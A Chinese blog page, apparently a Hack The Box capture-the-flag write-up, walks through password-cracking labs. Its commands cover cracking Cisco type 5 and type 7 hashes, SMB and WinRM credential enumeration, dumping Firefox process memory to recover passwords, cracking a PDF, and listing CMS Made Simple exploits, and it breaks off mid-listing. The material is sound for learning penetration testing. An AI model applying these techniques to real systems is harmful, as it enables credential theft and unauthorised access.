@@ -1,0 +1,415 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>WP-HTB-Password Cracking | 尘埃落定的空间站</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="这个Track是针对密码破解的练习。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="WP-HTB-Password Cracking">
+<meta property="og:url" content="http://example.com/2022/11/27/WP-HTB-Password-Cracking/index.html">
+<meta property="og:site_name" content="尘埃落定的空间站">
+<meta property="og:description" content="这个Track是针对密码破解的练习。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2022/11/27/WP-HTB-Password-Cracking/image-20221127125155795.png">
+<meta property="og:image" content="http://example.com/2022/11/27/WP-HTB-Password-Cracking/image-20221127125827446.png">
+<meta property="og:image" content="http://example.com/2022/11/27/WP-HTB-Password-Cracking/image-20221127132953334.png">
+<meta property="og:image" content="http://example.com/2022/11/27/WP-HTB-Password-Cracking/image-20221127133816486.png">
+<meta property="og:image" content="http://example.com/2022/11/27/WP-HTB-Password-Cracking/image-20221127135658760.png">
+<meta property="og:image" content="http://example.com/2022/11/27/WP-HTB-Password-Cracking/image-20221127143320602.png">
+<meta property="og:image" content="http://example.com/2022/11/27/WP-HTB-Password-Cracking/image-20221127145321819.png">
+<meta property="og:image" content="http://example.com/2022/11/27/WP-HTB-Password-Cracking/image-20221127154227092.png">
+<meta property="og:image" content="http://example.com/2022/11/27/WP-HTB-Password-Cracking/image-20221127154452848.png">
+<meta property="og:image" content="http://example.com/2022/11/27/WP-HTB-Password-Cracking/image-20221127173242182.png">
+<meta property="og:image" content="http://example.com/2022/11/27/WP-HTB-Password-Cracking/image-20221127173412335.png">
+<meta property="og:image" content="http://example.com/2022/11/27/WP-HTB-Password-Cracking/image-20221127173645759.png">
+<meta property="og:image" content="http://example.com/2022/11/27/WP-HTB-Password-Cracking/image-20221127173805961.png">
+<meta property="og:image" content="http://example.com/2022/11/27/WP-HTB-Password-Cracking/image-20221127174831192.png">
+<meta property="og:image" content="http://example.com/2022/11/27/WP-HTB-Password-Cracking/image-20221127175141688.png">
+<meta property="og:image" content="http://example.com/2022/11/27/WP-HTB-Password-Cracking/image-20221212200510609.png">
+<meta property="og:image" content="http://example.com/2022/11/27/WP-HTB-Password-Cracking/image-20221212201916498.png">
+<meta property="og:image" content="http://example.com/2022/11/27/WP-HTB-Password-Cracking/image-20221212203530009.png">
+<meta property="og:image" content="http://example.com/2022/11/27/WP-HTB-Password-Cracking/image-20221212203850956.png">
+<meta property="og:image" content="http://example.com/2022/11/27/WP-HTB-Password-Cracking/image-20221212213928275.png">
+<meta property="og:image" content="http://example.com/2022/11/27/WP-HTB-Password-Cracking/image-20221212215423237.png">
+<meta property="og:image" content="http://example.com/2022/11/27/WP-HTB-Password-Cracking/image-20221212222035320.png">
+<meta property="og:image" content="http://example.com/2022/11/27/WP-HTB-Password-Cracking/image-20221213001822043.png">
+<meta property="og:image" content="http://example.com/2022/11/27/WP-HTB-Password-Cracking/image-20221213002229646.png">
+<meta property="og:image" content="http://example.com/2022/11/27/WP-HTB-Password-Cracking/image-20221213011738020.png">
+<meta property="og:image" content="http://example.com/2022/11/27/WP-HTB-Password-Cracking/image-20221213012124291.png">
+<meta property="og:image" content="http://example.com/2022/11/27/WP-HTB-Password-Cracking/image-20221213013454441.png">
+<meta property="og:image" content="http://example.com/2022/11/27/WP-HTB-Password-Cracking/image-20221213014244847.png">
+<meta property="article:published_time" content="2022-11-27T02:49:34.000Z">
+<meta property="article:modified_time" content="2022-12-12T17:44:42.551Z">
+<meta property="article:author" content="尘埃落定">
+<meta property="article:tag" content="Pentest">
+<meta property="article:tag" content="HTB">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2022/11/27/WP-HTB-Password-Cracking/image-20221127125155795.png">
+  
+    <link rel="alternate" href="/atom.xml" title="尘埃落定的空间站" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">尘埃落定的空间站</a>
+      </h1>
+      
+        <h2 id="subtitle-wrap">
+          <a href="/" id="subtitle">Stay hungry, Stay foolish.</a>
+        </h2>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+          <a class="main-nav-link" href="/about">About</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="搜索"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="搜索"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-WP-HTB-Password-Cracking" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/11/27/WP-HTB-Password-Cracking/" class="article-date">
+  <time class="dt-published" datetime="2022-11-27T02:49:34.000Z" itemprop="datePublished">2022-11-27</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      WP-HTB-Password Cracking
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+	
+	  <div id="toc" class="toc-article">
+	    <strong class="toc-title">Toc</strong>
+	    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Heist"><span class="toc-number">1.</span> <span class="toc-text">Heist</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap"><span class="toc-number">1.1.</span> <span class="toc-text">Nmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IIS"><span class="toc-number">1.2.</span> <span class="toc-text">IIS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">1.3.</span> <span class="toc-text">提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.4.</span> <span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0ld-is-g0ld"><span class="toc-number">2.</span> <span class="toc-text">0ld is g0ld</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Writeup"><span class="toc-number">3.</span> <span class="toc-text">Writeup</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap-1"><span class="toc-number">3.1.</span> <span class="toc-text">Nmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#80%E7%AB%AF%E5%8F%A3"><span class="toc-number">3.2.</span> <span class="toc-text">80端口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E6%9D%83-1"><span class="toc-number">3.3.</span> <span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#PATH%E5%8A%AB%E6%8C%81"><span class="toc-number">3.3.1.</span> <span class="toc-text">PATH劫持</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-1"><span class="toc-number">3.4.</span> <span class="toc-text">总结</span></a></li></ol></li></ol>
+	  </div>
+	
+        <p>这个Track是针对密码破解的练习。</p>
+<span id="more"></span>
+
+<h2 id="Heist"><a href="#Heist" class="headerlink" title="Heist"></a>Heist</h2><p>一个Windows的靶机</p>
+<h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(tiger㉿kali)-[~/Desktop/hack-the-box]</span><br><span class="line">└─$ <span class="built_in">cat</span> nmap_scan.sh </span><br><span class="line">ip=10.10.10.149</span><br><span class="line">ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.149 | grep ^[0-9] | <span class="built_in">cut</span> -d <span class="string">&#x27;/&#x27;</span> -f1 | <span class="built_in">tr</span> <span class="string">&#x27;\n&#x27;</span> <span class="string">&#x27;,&#x27;</span> | sed s/,$//)</span><br><span class="line"></span><br><span class="line">nmap -p<span class="variable">$ports</span> -sC -sV <span class="variable">$ip</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221127125155795.png" alt="image-20221127125155795"></p>
+<h3 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h3><p>登录80端口后，先使用guest账户登录</p>
+<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221127125827446.png" alt="image-20221127125827446"></p>
+<p>提示<code>cisco</code>路由器存在问题，查看一下配置</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">version 12.2</span><br><span class="line">no service pad</span><br><span class="line">service password-encryption</span><br><span class="line">!</span><br><span class="line">isdn switch-type basic-5ess</span><br><span class="line">!</span><br><span class="line">hostname ios-1</span><br><span class="line">!</span><br><span class="line">security passwords min-length 12</span><br><span class="line"><span class="comment"># secret</span></span><br><span class="line"><span class="built_in">enable</span> secret 5 $1$pdQG<span class="variable">$o8nrSzsGXeaduXrjlvKc91</span></span><br><span class="line">!</span><br><span class="line"><span class="comment"># password </span></span><br><span class="line">username rout3r password 7 0242114B0E143F015F5D1E161713</span><br><span class="line">username admin privilege 15 password 7 02375012182C1A1D751618034F36415408</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">ip ssh authentication-retries 5</span><br><span class="line">ip ssh version 2</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">router bgp 100</span><br><span class="line"> synchronization</span><br><span class="line"> bgp log-neighbor-changes</span><br><span class="line"> bgp dampening</span><br><span class="line"> network 192.168.0.0Â mask 300.255.255.0</span><br><span class="line"> timers bgp 3 9</span><br><span class="line"> redistribute connected</span><br><span class="line">!</span><br><span class="line">ip classless</span><br><span class="line">ip route 0.0.0.0 0.0.0.0 192.168.0.1</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">access-list 101 permit ip any any</span><br><span class="line">dialer-list 1 protocol ip list 101</span><br><span class="line">!</span><br><span class="line">no ip http server</span><br><span class="line">no ip http secure-server</span><br><span class="line">!</span><br><span class="line">line vty 0 4</span><br><span class="line"> session-timeout 600</span><br><span class="line"> authorization <span class="built_in">exec</span> SSH</span><br><span class="line"> transport input ssh</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>cisco配置文件<br><a target="_blank" rel="noopener" href="https://community.cisco.com/t5/networking-knowledge-base/understanding-the-differences-between-the-cisco-password-secret/ta-p/3163238">https://community.cisco.com/t5/networking-knowledge-base/understanding-the-differences-between-the-cisco-password-secret/ta-p/3163238</a></p>
+<blockquote>
+<p>Type 5</p>
+<p>These use a salted MD5 hashing algorithm. These should only be used if Type 6, 8, or 9 is not available on the IOS version you are running. Attempting to use Type 5 in modern IOS XE will throw an error as these will be depreciated soon. In the running config these start with $5$.</p>
+<p>Type 7</p>
+<p>These use the Vigenere cipher, a very simple algorithm that was cracked in 1995. These are easily reversible with tools on the internet. These should never be used and attempting to use Type 7 in modern IOS XE will throw an error as these will be depreciated soon.</p>
+</blockquote>
+<p>在线破解Type7：0242114B0E143F015F5D1E161713，<a target="_blank" rel="noopener" href="https://www.ifm.net.nz/cookbooks/passwordcracker.html">https://www.ifm.net.nz/cookbooks/passwordcracker.html</a></p>
+<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221127132953334.png" alt="image-20221127132953334"></p>
+<p>破解Type5：$1$pdQG$o8nrSzsGXeaduXrjlvKc91，在线的爆破太慢了，一直卡顿在length&#x3D;3</p>
+<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221127133816486.png" alt="image-20221127133816486"></p>
+<p>使用Jonh进行爆破，字典使用：<code>rockyou.txt</code></p>
+<p><a target="_blank" rel="noopener" href="https://www.kaggle.com/datasets/wjburns/common-password-list-rockyoutxt">https://www.kaggle.com/datasets/wjburns/common-password-list-rockyoutxt</a></p>
+<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221127135658760.png" alt="image-20221127135658760"></p>
+<p>可以看到爆破结果：stealth1agent</p>
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>使用<code>crackmapexec</code>对issue页面的用户admin、hazard进行smb用户枚举（445）<a target="_blank" rel="noopener" href="https://www.kali.org/tools/crackmapexec/">https://www.kali.org/tools/crackmapexec/</a></p>
+<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221127143320602.png" alt="image-20221127143320602"></p>
+<p>Hazard:stealth1agent</p>
+<p>WinRM服务默认启动并监听了5985端口，尝试登入，登录失败</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(tiger㉿kali)-[~/Desktop/hack-the-box]</span><br><span class="line">└─$ crackmapexec winrm 10.10.10.149 -u hazard -p stealth1agent</span><br><span class="line">SMB         10.10.10.149    5985   NONE             [*] None (name:10.10.10.149) (domain:None)</span><br><span class="line">HTTP        10.10.10.149    5985   NONE             [*] http://10.10.10.149:5985/wsman</span><br><span class="line">WINRM       10.10.10.149    5985   NONE             [-] None\hazard:stealth1agent</span><br></pre></td></tr></table></figure>
+
+<p>继续爆破rid，发现该域下有很多用户</p>
+<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221127145321819.png" alt="image-20221127145321819"></p>
+<p>更新password.txt与user列表再次进行smb枚举，发现了新的组合：<code>[+] SupportDesk\Chase:Q4)sJu\Y8qz*A3?d</code></p>
+<p>使用<a target="_blank" rel="noopener" href="https://github.com/Hackplayers/evil-winrm">evil-winrm</a>登录WinRM，如下</p>
+<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221127154227092.png" alt="image-20221127154227092"></p>
+<p>查看桌面文件</p>
+<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221127154452848.png" alt="image-20221127154452848"></p>
+<p>通过检查，发现活跃的进程firefox</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\Chase\Desktop&gt; get-process -name firefox</span><br><span class="line"></span><br><span class="line">Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName</span><br><span class="line">-------  ------    -----      -----     ------     --  -- -----------</span><br><span class="line">    378      28    23012      60164       1.28   4056   1 firefox</span><br><span class="line">   1091      71   148392     225844       8.23   4288   1 firefox</span><br><span class="line">    401      34    34828      93236       1.98   5344   1 firefox</span><br><span class="line">    347      19    10224      39796       0.11   6000   1 firefox</span><br><span class="line">    355      25    16476      39124       0.16   6788   1 firefox</span><br></pre></td></tr></table></figure>
+
+<p>dump进程内存：<a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/sysinternals/downloads/procdump">procdump</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 上传procdump</span></span><br><span class="line">*Evil-WinRM* PS C:\Users\Chase\Desktop&gt; upload /home/tiger/桌面/procdump.exe </span><br><span class="line">Info: Uploading /home/tiger/桌面/procdump.exe to C:\Users\Chase\Desktop\procdump.exe</span><br><span class="line"></span><br><span class="line">                                                             </span><br><span class="line">Data: 1055944 bytes of 1055944 bytes copied</span><br><span class="line"></span><br><span class="line">Info: Upload successful!</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\Chase\Desktop&gt; </span><br><span class="line"></span><br><span class="line"><span class="comment"># dump整个内存，-ma参数</span></span><br><span class="line">*Evil-WinRM* PS C:\Users\Chase\Desktop&gt; .\procdump.exe -accepteula -ma 4288 firefox.dmp </span><br><span class="line"></span><br><span class="line">ProcDump v11.0 - Sysinternals process dump utility</span><br><span class="line">Copyright (C) 2009-2022 Mark Russinovich and Andrew Richards</span><br><span class="line">Sysinternals - www.sysinternals.com</span><br><span class="line"></span><br><span class="line">[14:05:23] Dump 1 initiated: C:\Users\Chase\Desktop\firefox.dmp</span><br><span class="line">[14:05:24] Dump 1 writing: Estimated dump file size is 514 MB.</span><br><span class="line">[14:05:25] Dump 1 complete: 514 MB written <span class="keyword">in</span> 1.4 seconds</span><br><span class="line">[14:05:25] Dump count reached.</span><br></pre></td></tr></table></figure>
+
+<p>使用项目：<a target="_blank" rel="noopener" href="https://www.secureauth.com/labs/open-source-tools/impacket/">https://www.secureauth.com/labs/open-source-tools/impacket/</a> ，快速开启一个smbserver传递文件</p>
+<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221127173242182.png" alt="image-20221127173242182"></p>
+<p>在Windows主机上拷贝文件到共享目录</p>
+<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221127173412335.png" alt="image-20221127173412335"></p>
+<p>在前面的80端口，Hazard需要一个账户进行登录，抓一下登录的包</p>
+<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221127173645759.png" alt="image-20221127173645759"></p>
+<p>内存搜索，找到了：</p>
+<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221127173805961.png" alt="image-20221127173805961"></p>
+<p>使用这组<a href="mailto:&#x61;&#100;&#x6d;&#105;&#x6e;&#64;&#x73;&#117;&#x70;&#112;&#111;&#114;&#x74;&#46;&#104;&#116;&#x62;">&#x61;&#100;&#x6d;&#105;&#x6e;&#64;&#x73;&#117;&#x70;&#112;&#111;&#114;&#x74;&#46;&#104;&#116;&#x62;</a>:4dD!5}x&#x2F;re8]FBuZ，再次进行登录</p>
+<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221127174831192.png" alt="image-20221127174831192"></p>
+<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221127175141688.png" alt="image-20221127175141688"></p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul>
+<li><input disabled type="checkbox"> WinRM</li>
+<li><input disabled type="checkbox"> SMB</li>
+</ul>
+<h2 id="0ld-is-g0ld"><a href="#0ld-is-g0ld" class="headerlink" title="0ld is g0ld"></a>0ld is g0ld</h2><p>打开后，发现一个pdf文件被加密了</p>
+<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221212200510609.png" alt="image-20221212200510609"></p>
+<p>使用<code>pdfcrack</code>进行暴力破解</p>
+<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221212201916498.png" alt="image-20221212201916498"></p>
+<p>解密后，图片如下</p>
+<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221212203530009.png" alt="image-20221212203530009"></p>
+<p>在线解码</p>
+<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221212203850956.png" alt="image-20221212203850956"></p>
+<h2 id="Writeup"><a href="#Writeup" class="headerlink" title="Writeup"></a>Writeup</h2><p>从提供的信息来看像是一道Web的靶机</p>
+<h3 id="Nmap-1"><a href="#Nmap-1" class="headerlink" title="Nmap"></a>Nmap</h3><p>使用之前的脚步进行端口扫描</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">┌──(tiger㉿kali)-[~/桌面/hack-the-box]</span><br><span class="line">└─$ ./nmap_scan.sh     </span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-12 21:00 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.138</span><br><span class="line">Host is up (0.097s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE  SERVICE VERSION</span><br><span class="line">22/tcp open   ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 <span class="built_in">dd</span>:53:10:70:0b:d0:47:0a:e2:7e:4a:b6:42:98:23:c7 (RSA)</span><br><span class="line">|   256 37:2e:14:68:ae:b9:c2:34:2b:6e:d9:92:bc:bf:bd:28 (ECDSA)</span><br><span class="line">|_  256 93:ea:a8:40:42:c1:a8:33:85:b3:56:00:62:1c:a0:ab (ED25519)</span><br><span class="line">80/tcp closed http</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 4.59 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="80端口"><a href="#80端口" class="headerlink" title="80端口"></a>80端口</h3><p>对80端口进行目录扫描：<code>dirsearch</code>（失败）、尝试访问robots.txt</p>
+<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221212213928275.png" alt="image-20221212213928275"></p>
+<p>访问，看到可能存在的注入点（<code>sqlmap</code>尝试后好像方向不对）</p>
+<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221212215423237.png" alt="image-20221212215423237"></p>
+<p>查看主页源码，发现了PHP的<code>CMS</code>框架</p>
+<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221212222035320.png" alt="image-20221212222035320"></p>
+<p>利用</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">┌──(tiger㉿kali)-[~/桌面/hack-the-box]</span><br><span class="line">└─$ searchsploit <span class="string">&quot;CMS Made Simple&quot;</span>                            </span><br><span class="line">---------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line"> Exploit Title                                                                                                                                                              |  Path</span><br><span class="line">---------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">CMS Made Simple (CMSMS) Showtime2 - File Upload Remote Code Execution (Metasploit)                                                                                          | php/remote/46627.rb</span><br><span class="line">CMS Made Simple 0.10 - <span class="string">&#x27;index.php&#x27;</span> Cross-Site Scripting                                                                                                                     | php/webapps/26298.txt</span><br><span class="line">CMS Made Simple 0.10 - <span class="string">&#x27;Lang.php&#x27;</span> Remote File Inclusion                                                                                                                     | php/webapps/26217.html</span><br><span class="line">CMS Made Simple 1.0.2 - <span class="string">&#x27;SearchInput&#x27;</span> Cross-Site Scripting                                                                                                                  | php/webapps/29272.txt</span><br><span class="line">CMS Made Simple 1.0.5 - <span class="string">&#x27;Stylesheet.php&#x27;</span> SQL Injection                                                                                                                      | php/webapps/29941.txt</span><br><span class="line">CMS Made Simple 1.11.10 - Multiple Cross-Site Scripting Vulnerabilities                                                                                                     | php/webapps/32668.txt</span><br><span class="line">CMS Made Simple 1.11.9 - Multiple Vulnerabilities                                                                                                                           | php/webapps/43889.txt</span><br><span class="line">CMS Made Simple 1.2 - Remote Code Execution                                                                                                                                 | php/webapps/4442.txt</span><br><span class="line">CMS Made Simple 1.2.2 Module TinyMCE - SQL Injection                                                                                                                        | php/webapps/4810.txt</span><br><span class="line">CMS Made Simple 1.2.4 Module FileManager - Arbitrary File Upload                                                                                                            | php/webapps/5600.php</span><br><span class="line">CMS Made Simple 1.4.1 - Local File Inclusion                                                                                                                                | php/webapps/7285.txt</span><br><span class="line">CMS Made Simple 1.6.2 - Local File Disclosure                                                                                                                               | php/webapps/9407.txt</span><br><span class="line">CMS Made Simple 1.6.6 - Local File Inclusion / Cross-Site Scripting                                                                                                         | php/webapps/33643.txt</span><br><span class="line">CMS Made Simple 1.6.6 - Multiple Vulnerabilities                                                                                                                            | php/webapps/11424.txt</span><br><span class="line">CMS Made Simple 1.7 - Cross-Site Request Forgery                                                                                                                            | php/webapps/12009.html</span><br><span class="line">CMS Made Simple 1.8 - <span class="string">&#x27;default_cms_lang&#x27;</span> Local File Inclusion                                                                                                               | php/webapps/34299.py</span><br><span class="line">CMS Made Simple 1.x - Cross-Site Scripting / Cross-Site Request Forgery                                                                                                     | php/webapps/34068.html</span><br><span class="line">CMS Made Simple 2.1.6 - <span class="string">&#x27;cntnt01detailtemplate&#x27;</span> Server-Side Template Injection                                                                                              | php/webapps/48944.py</span><br><span class="line">CMS Made Simple 2.1.6 - Multiple Vulnerabilities                                                                                                                            | php/webapps/41997.txt</span><br><span class="line">CMS Made Simple 2.1.6 - Remote Code Execution                                                                                                                               | php/webapps/44192.txt</span><br><span class="line">CMS Made Simple 2.2.14 - Arbitrary File Upload (Authenticated)                                                                                                              | php/webapps/48779.py</span><br><span class="line">CMS Made Simple 2.2.14 - Authenticated Arbitrary File Upload                                                                                                                | php/webapps/48742.txt</span><br><span class="line">CMS Made Simple 2.2.14 - Persistent Cross-Site Scripting (Authenticated)                                                                                                    | php/webapps/48851.txt</span><br><span class="line">CMS Made Simple 2.2.15 - <span class="string">&#x27;title&#x27;</span> Cross-Site Scripting (XSS)                                                                                                                 | php/webapps/49793.txt</span><br><span class="line">CMS Made Simple 2.2.15 - RCE (Authenticated)                                                                                                                                | php/webapps/49345.txt</span><br><span class="line">CMS Made Simple 2.2.15 - Stored Cross-Site Scripting via SVG File Upload (Authenticated)                                                                                    | php/webapps/49199.txt</span><br><span class="line">CMS Made Simple 2.2.5 - (Authenticated) Remote Code Execution                                                                                                               | php/webapps/44976.py</span><br><span class="line">CMS Made Simple 2.2.7 - (Authenticated) Remote Code Execution                                                                                                               | php/webapps/45793.py</span><br><span class="line">CMS Made Simple &lt; 1.12.1 / &lt; 2.1.3 - Web Server Cache Poisoning                                                                                                             | php/webapps/39760.txt</span><br><span class="line">CMS Made Simple &lt; 2.2.10 - SQL Injection                                                                                                                                    | php/webapps/46635.py</span><br><span class="line">CMS Made Simple Module Antz Toolkit 1.02 - Arbitrary File Upload                                                                                                            | php/webapps/34300.py</span><br><span class="line">CMS Made 